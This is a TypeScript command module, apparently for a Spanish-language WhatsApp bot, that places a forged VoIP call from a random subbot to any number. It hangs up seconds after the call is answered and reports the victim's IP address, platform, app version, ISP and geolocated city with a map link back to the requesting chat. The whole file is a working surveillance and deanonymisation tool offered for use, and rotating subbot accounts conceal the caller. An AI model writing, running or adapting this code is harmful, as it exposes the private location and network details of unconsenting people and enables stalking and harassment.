import { randomBytes } from "node:crypto";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const SWN = "@s.whatsapp.net";
const seen = new WeakSet<object>();

type Pend = {
  id: string;
  chat: string;
  requester: string;
  cmdMsg: any;
  sock: any;
  target: string;
  callId?: string;
  ip?: string;
  platform?: string;
  version?: string;
  done: boolean;
  timer?: NodeJS.Timeout;
};

const P: Map<string, Pend> = ((globalThis as any).__voipPending ??= new Map());
const log = (...a: any[]) => process.env.VOIP_DEBUG === "1" && console.log("[voip]", ...a);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/* ───────────────────────── helpers ───────────────────────── */

const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
const bare = (j: string) => `${digits(j)}${SWN}`;

function walk(node: any, out: any[] = []): any[] {
  if (!node) return out;
  out.push(node);
  const c = node.content;
  if (Array.isArray(c)) for (const k of c) walk(k, out);
  return out;
}

function findNet(node: any): string | undefined {
  for (const n of walk(node)) {
    if (String(n?.tag || "").toLowerCase().includes("net")) {
      const a = n.attrs || {};
      const addr = a.addr || a.ip || a.host;
      if (addr && /[0-9a-f.:]/i.test(String(addr))) return String(addr).split(":")[0];
    }
  }
  return undefined;
}

function attrsOf(node: any) {
  const out: Record<string, string> = {};
  for (const n of walk(node)) {
    const a = n.attrs || {};
    if (a.platform && !out.platform) out.platform = String(a.platform);
    if (a.version && !out.version) out.version = String(a.version);
  }
  return out;
}

async function geo(ip: string) {
  if (!ip || ip === "0.0.0.0") return null;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "voip" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch {
    return null;
  }
}

/* ───────────────────────── subbots ───────────────────────── */

function pool(ctx: any): any[] {
  const G = globalThis as any;
  const cands = [G.subbots, G.__subbots, G.subbotManager?.list, G.subbotManager?.all, G.subbotManager?.sockets, ctx.subbots, ctx.subbotManager?.list];
  for (const c of cands) {
    if (!c) continue;
    let arr: any[] = [];
    if (typeof c.values === "function") arr = [...c.values()];
    else if (Array.isArray(c)) arr = c;
    else if (typeof c === "object") arr = Object.values(c);
    const socks = arr.map((x: any) => x?.sock ?? x?.client ?? x).filter((s: any) => s && typeof s.sendMessage === "function" && s.ws);
    if (socks.length) return socks;
  }
  return [];
}

/* ───────────────────────── stanzas ───────────────────────── */

function hookCall(sock: any) {
  if (seen.has(sock)) return;
  seen.add(sock);

  sock.ws.on("CB:call", (node: any) => {
    try {
      const first = Array.isArray(node?.content) ? node.content[0] : null;
      const tag = String(first?.tag || "").toLowerCase();
      const callId = String(first?.attrs?.["call-id"] || first?.attrs?.call_id || node?.attrs?.id || "");
      const from = String(node?.attrs?.from || first?.attrs?.["call-creator"] || "");
      const who = digits(from);
      const p = P.get(who);
      log("CB:call", tag, who, callId);

      if (!p || p.done) return;

      if (tag === "offer" || tag === "accept" || tag === "transport" || tag === "preaccept") {
        const a = attrsOf(first);
        if (a.platform) p.platform = a.platform;
        if (a.version) p.version = a.version;
        const ip = findNet(first) || findNet(node);
        if (ip && ip !== "0.0.0.0") p.ip = ip;
      }

      if (tag === "accept" && !p.done) {
        p.callId = callId || p.callId;
        if (p.timer) clearTimeout(p.timer);
        /* espera 2-3 s y corta */
        p.timer = setTimeout(() => finish(p).catch(() => undefined), 2000 + Math.floor(Math.random() * 1000));
      }
    } catch {}
  });
}

async function hangup(sock: any, target: string, callId?: string) {
  try {
    await sock.sendNode({
      tag: "call",
      attrs: { to: bare(target), id: sock.generateMessageTag?.() || `${Date.now()}` },
      content: [{ tag: "terminate", attrs: callId ? { "call-id": callId } : {} }],
    });
  } catch {}
}

async function offer(sock: any, target: string, callId: string) {
  /* 1 · si el fork trae offerCall, se usa */
  for (const fn of ["offerCall", "sendCallOffer", "callOffer"]) {
    if (typeof sock[fn] === "function") {
      try { await sock[fn](bare(target)); return "nativo"; } catch {}
    }
  }

  /* 2 · oferta manual con Signal */
  const { encodeWAMessage, getBinaryNodeChild, parseAndInjectE2ESessions, jidNormalizedUser } = await import("baileys");

  const me = sock.authState?.creds?.me?.id || sock.user?.id;
  const to = bare(target);

  let devs: string[] = [];
  try {
    const list = await sock.getUSyncDevices([to], true, false);
    devs = (list || []).map((d: any) => d.jid).filter(Boolean);
  } catch {}
  const route = devs[0] || to;

  try {
    const node = await sock.query({
      tag: "iq",
      attrs: { xmlns: "encrypt", type: "get", to: SWN },
      content: [{ tag: "key", attrs: {}, content: [{ tag: "user", attrs: { jid: route } }] }],
    });
    await parseAndInjectE2ESessions(node, sock.signalRepository);
  } catch {}

  const callKey = randomBytes(32);
  const { type, ciphertext } = await sock.signalRepository.encryptMessage({
    jid: route,
    data: encodeWAMessage({ call: { callKey } }),
  });

  await sock.sendNode({
    tag: "call",
    attrs: { to: route, id: sock.generateMessageTag?.() || `${Date.now()}` },
    content: [{
      tag: "offer",
      attrs: {
        "call-creator": jidNormalizedUser(me),
        "call-id": callId,
        platform: "web",
        version: "2.3000.1037863797",
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "net", attrs: { medium: "3", protocol: "0" } },
        { tag: "capability", attrs: { ver: "1" }, content: Buffer.from([0x01, 0x04, 0x05, 0x09, 0x0a, 0x0b]) },
        { tag: "enc", attrs: { v: "2", type, count: "0" }, content: Buffer.from(ciphertext) },
        { tag: "encopt", attrs: { keygen: "2" } },
      ],
    }],
  });

  return "manual";
}

/* ───────────────────────── cierre ───────────────────────── */

async function finish(p: Pend) {
  if (p.done) return;
  p.done = true;
  if (p.timer) clearTimeout(p.timer);
  P.delete(digits(p.target));

  await hangup(p.sock, p.target, p.callId);

  const ip = p.ip || "";
  const g = ip ? await geo(ip) : null;
  const num = digits(p.target);
  const plat = p.platform || "desconocido";

  let name = "";
  try {
    const wa: any = await p.sock.onWhatsApp?.(num).catch(() => null);
    name = wa?.[0]?.notify || "";
  } catch {}

  const lines = [
    `📞 *Información de la llamada*`,
    name ? `Contacto: ${name}` : "",
    `Número: +${num}`,
    g ? `País: ${g.country || "?"}` : "",
    g ? `Ciudad: ${g.city || "?"}${g.region ? ` (${g.region})` : ""}` : "",
    ip ? `IP: \`${ip}\`` : "IP: `no expuesta (relay)`",
    `Plataforma: ${plat}`,
    p.version ? `Versión de WhatsApp: ${p.version}` : "",
    g?.org ? `Red: ${g.org}` : "",
    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
    `Hora: ${new Date().toLocaleString("es-MX")}`,
  ].filter(Boolean);

  await p.sock.sendMessage(p.chat, { text: lines.join("\n") }, { quoted: p.cmdMsg }).catch(() => undefined);
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["voip", "llamar", "call"],
  category: "system",
  description: "Llama desde un subbot aleatorio, cuelga a los 2-3 s y devuelve IP, país, ciudad, plataforma y versión al chat.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const requester: string = (msg.key as any).participant || from;

    const raw = (args[0] || "").replace(/\D/g, "");
    const quoted: string | undefined = info.participant;

    let target: string;
    if (raw.length >= 8) target = bare(raw);
    else if (quoted) target = bare(quoted);
    else if (info.mentionedJid?.length) target = bare(info.mentionedJid[0]);
    else {
      await reply("Uso: `.voip +573118353868` o responde a alguien con `.voip`.").catch(() => undefined);
      return;
    }

    if (target.endsWith("@g.us")) {
      await reply("Pásame un número o responde a una persona, no a un grupo.").catch(() => undefined);
      return;
    }

    const key = digits(target);
    if (P.has(key)) {
      await reply(`Ya hay una llamada en curso hacia +${key}.`).catch(() => undefined);
      return;
    }

    const subs = pool(ctx);
    const candidates = subs.length ? subs : [sock];
    const callSock = candidates[Math.floor(Math.random() * candidates.length)];

    hookCall(callSock);

    const p: Pend = {
      id: key,
      chat: from,
      requester,
      cmdMsg: msg,
      sock: callSock,
      target,
      done: false,
    };
    P.set(key, p);

    await react("📞").catch(() => undefined);

    const me = callSock.authState?.creds?.me?.id || callSock.user?.id || "?";
    await reply(
      `📞 Llamando a +${key} desde \`${digits(me)}\`${subs.length ? ` (subbot ${candidates.indexOf(callSock) + 1}/${candidates.length})` : ""}…`,
    ).catch(() => undefined);

    const callId = `${Date.now()}-${randomBytes(4).toString("hex")}`;

    let mode = "";
    try {
      mode = await offer(callSock, target, callId);
    } catch (e: any) {
      P.delete(key);
      await react("❌").catch(() => undefined);
      await reply(`No se pudo marcar: ${e?.message || e}`).catch(() => undefined);
      return;
    }

    /* timeout: si no contesta en 45 s */
    p.timer = setTimeout(async () => {
      if (p.done) return;
      p.done = true;
      P.delete(key);
      await hangup(callSock, target, callId);
      await reply(`⏱️ +${key} no contestó.`).catch(() => undefined);
    }, 45000);

    log("oferta enviada", key, mode);
  },
};
